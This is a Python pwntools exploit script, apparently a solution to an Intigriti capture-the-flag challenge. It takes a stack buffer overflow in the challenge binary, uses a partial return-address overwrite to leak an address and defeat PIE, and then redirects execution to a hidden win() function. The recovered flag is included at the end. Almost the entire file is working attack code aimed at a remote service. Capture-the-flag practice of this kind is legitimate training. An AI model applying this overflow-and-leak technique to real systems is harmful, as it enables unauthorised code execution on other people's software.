#! /bin/env python3

from pwn import *
from termcolor import colored

def bold_hex(text):
	return colored(hex(text), attrs=['bold'])

context.binary = binary_info = ELF('./chall')

buffer_size = (7+2) * context.bytes

binary_addr_main = binary_info.symbols['main']
log.info('function "main" address: ' + bold_hex(binary_addr_main))

binary_addr_win = binary_info.symbols['_']
log.info('function "win" address: ' + bold_hex(binary_addr_win))

gdbscript = '''
#b *(input+131)
continue
'''

if args.REMOTE:
	p = remote('hidden2.ctf.intigriti.io', 1337)
else:
	if args.GDB:
		p = gdb.debug(binary_info.path, gdbscript=gdbscript)
	else:
		p = process(binary_info.path)

p.settimeout(2)

log.info('loop back into: 00101359 - CALL input')
payload = (b'X' * buffer_size ) + p8(0x59)
p.sendafter(b"Tell me something:", payload)

log.info('retrieve return address from stack')
p.recvuntil(b'I remember what you said: ')
leak = p.recvline()[buffer_size:][:-1]
leak = unpack(leak.ljust(context.bytes, b'\x00'))
log.success('leak: ' + bold_hex(leak))

log.info('rebuild main() address')
leak &= 0xffffffffffffff00
leak |= 0x000000000000001a
log.success('main() address: ' + bold_hex(leak))

log.info('calculate win() address')
target = leak - (binary_addr_main - binary_addr_win)
log.success('win() address: ' + bold_hex(target))

log.info('sending final payload - good luck')
payload = (b'X' * buffer_size ) + pack(target)
p.sendafter(b"Tell me something:", payload)

p.recvuntil(b'I remember what you said: ')
p.recvline()

print(p.recvall())

# INTIGRITI{h1dd3n_r3T2W1n_G00_BrrRR}
